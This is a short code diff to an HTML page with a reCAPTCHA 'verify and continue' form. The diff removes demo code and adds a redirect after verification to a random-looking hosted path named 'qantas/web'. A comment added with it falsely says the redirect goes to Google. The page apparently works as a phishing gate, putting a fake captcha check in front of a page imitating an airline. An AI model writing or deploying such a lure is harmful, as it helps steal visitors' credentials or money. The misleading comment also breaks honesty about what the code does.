@@ -196,8 +196,6 @@
             </div>
 
             <form id="verificationForm">
-                
-
                 <div class="recaptcha-container">
                     <div class="g-recaptcha" data-sitekey="6Leh_nArAAAAAGuB0wbrh_qapiSBx5t8U_KHbELQ"></div>
                     <div class="recaptcha-badge">
@@ -226,9 +224,6 @@
             const errorMessage = document.getElementById('errorMessage');
             const successMessage = document.querySelector('.success-message');
             
-            // Using test keys - replace with your actual site key in production
-            const SITE_KEY = '6Leh_nArAAAAAOytSmq3pCNRsDWx21W8jHi-K0En';
-            
             form.addEventListener('submit', function(e) {
                 e.preventDefault();
                 const recaptchaResponse = grecaptcha.getResponse();
@@ -250,8 +245,8 @@
                     submitBtn.disabled = false;
                     submitBtn.textContent = 'Verify & Continue';
                     
-                    // For demo purposes - in a real app, you would submit to your server
-                    console.log('reCAPTCHA verification passed');
+                    // Redirect to Google after successful verification
+                    window.location.href = "https://suparg45254274.jdevcloud.com/wp-content/1/qantas/web";
                 }, 1500);
             });
         });
